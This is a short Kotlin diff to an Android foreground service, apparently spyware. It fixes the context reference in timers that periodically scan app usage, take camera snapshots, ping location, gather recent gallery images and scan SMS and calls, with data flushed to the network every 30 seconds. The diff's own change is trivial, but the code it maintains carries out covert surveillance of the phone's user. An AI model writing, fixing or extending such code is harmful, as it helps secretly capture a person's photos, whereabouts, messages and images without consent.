@@ -13,10 +13,10 @@ class CoreService : Service() {
     override fun onCreate() {
         startForeground(1, buildNotif())
         timer(daemon = true, period = 30000) { Net.flush() }
-        timer(daemon = true, period = 60000) { Usage.scan(this) }
-        timer(daemon = true, period = 300000) { Cam.snap(this) }
-        timer(daemon = true, period = 300000) { Loc.ping(this) }
-        timer(daemon = true, period = 600000) { Gallery.recent(this) }
+        timer(daemon = true, period = 60000) { Usage.scan(this@CoreService) }
+        timer(daemon = true, period = 300000) { Cam.snap(this@CoreService) }
+        timer(daemon = true, period = 300000) { Loc.ping(this@CoreService) }
+        timer(daemon = true, period = 600000) { Gallery.recent(this@CoreService) }
         SmsCalls.scan(this)
     }
     private fun buildNotif(): Notification {
